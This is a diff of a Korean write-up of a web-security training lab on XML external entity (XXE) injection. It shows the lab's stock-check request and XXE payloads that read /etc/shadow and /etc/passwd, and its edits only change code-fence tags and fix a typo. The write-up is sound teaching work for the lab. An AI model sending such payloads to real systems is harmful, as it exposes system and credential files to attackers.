@@ -33,7 +33,7 @@ To solve the lab, inject an XML external entity to retrieve the contents of the 
 
 버튼을 클릭하면 다음 요청이 전송된다. 
 
-```
+```http
 POST /product/stock HTTP/1.1
 Host: 0a52000f032ecba6c08c8b1900120054.web-security-academy.net
 Cookie: session=1uOtwtnBX2Udo4b3VfYEXUpYiZuR7xja
@@ -59,7 +59,8 @@ Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7onnection: close
 ```
 
 HTTP 응답은 다음과 같다. 
-```
+
+```http
 HTTP/1.1 200 OK
 Content-Type: text/plain; charset=utf-8
 Connection: close
@@ -75,7 +76,7 @@ POST 요청의 XML 바디 부분에 XXE 공격 페이로드를 넣으면 될 것
 를 참고해서 
 `<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>` 를 추가해서 보내봤다. 
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE replace [<!ENTITY foo SYSTEM "file:///etc/shadow"> ]>
 <stockCheck>
@@ -87,9 +88,9 @@ POST 요청의 XML 바디 부분에 XXE 공격 페이로드를 넣으면 될 것
 200 응답이 되돌아왔다. 뭔가 잘못된 것 같다. 
 
 ## 2차 시도 
-아, 페이로드에 `&foo;` 로 출력해주는 부분이 없었다. 다음 페이로드로 시도해보자 /etc/passwd의 내용을 확인할 수 있었따. 
+아, 페이로드에 `&foo;` 로 출력해주는 부분이 없었다. 다음 페이로드로 시도해보자 /etc/passwd의 내용을 확인할 수 있었다. 
 
-``` 
+```xml
 <!DOCTYPE test [<!ENTITY foo SYSTEM "file:///etc/passwd"> ]>
 <stockCheck>
     <productId>&foo;</productId>
